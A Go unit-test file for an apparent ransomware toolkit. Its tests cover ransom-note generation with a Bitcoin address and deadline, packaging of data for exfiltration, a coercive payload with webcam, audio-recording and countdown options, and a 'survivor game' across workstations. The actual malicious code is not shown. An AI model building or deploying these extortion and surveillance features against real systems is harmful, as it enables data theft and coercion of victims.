package ransomware

import (
	"testing"
)

func TestNewExtortionEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewExtortionEngine(cfg)
	if e == nil {
		t.Fatal("NewExtortionEngine() returned nil")
	}
}

func TestNewPsychologicalEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPsychologicalEngine(cfg)
	if p == nil {
		t.Fatal("NewPsychologicalEngine() returned nil")
	}
}

func TestNewPsychologicalAdvancedEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	pa := NewPsychologicalAdvancedEngine(cfg)
	if pa == nil {
		t.Fatal("NewPsychologicalAdvancedEngine() returned nil")
	}
}

func TestExtortionEngineGenerateNote(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewExtortionEngine(cfg)

	note := e.GenerateRansomNote("TestCorp", "test-campaign-123")
	if note == nil {
		t.Fatal("GenerateRansomNote returned nil")
	}
	if note.Title == "" {
		t.Error("Ransom note title empty")
	}
	if note.RansomAmount != cfg.RansomAmount {
		t.Errorf("expected amount %.2f, got %.2f", cfg.RansomAmount, note.RansomAmount)
	}
	if note.BitcoinAddress == "" {
		t.Error("Bitcoin address empty")
	}
	if note.ContactURL == "" {
		t.Log("ContactURL empty (may be expected)")
	}
	t.Logf("Ransom note: %s | Amount: %.2f %s | Deadline: %s",
		note.Title, note.RansomAmount, note.Currency, note.Deadline)
}

func TestExtortionEnginePackageData(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	e := NewExtortionEngine(cfg)

	pkg := e.PackageData("/tmp/test_exfil", "test-password")
	if pkg == nil {
		t.Log("PackageData returned nil (expected in test env)")
	} else {
		t.Logf("Exfil package: ID=%s Size=%d Files=%d",
			pkg.ID, pkg.TotalSize, pkg.FileCount)
	}
}

func TestPsychologicalEnginePayload(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	p := NewPsychologicalEngine(cfg)

	payload := p.BuildPayload()
	if payload == nil {
		t.Fatal("BuildPayload returned nil")
	}
	if !payload.ShowCountdown {
		t.Log("ShowCountdown disabled (simulation)")
	}
	t.Logf("Psych payload: webcam=%v audio=%v print=%v duration=%ds",
		payload.CaptureWebcam, payload.RecordAudio, payload.PrintRansomNote, payload.DurationSeconds)
}

func TestSurvivorGameEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	s := NewSurvivorGameEngine(cfg)
	if s == nil {
		t.Fatal("NewSurvivorGameEngine() returned nil")
	}

	winner := s.SimulateGame([]string{"WS-01", "WS-02", "WS-03", "WS-04", "WS-05"})
	if winner == "" {
		t.Log("SimulateGame returned empty (expected in test env)")
	} else {
		t.Logf("Survivor winner: %s", winner)
	}
}
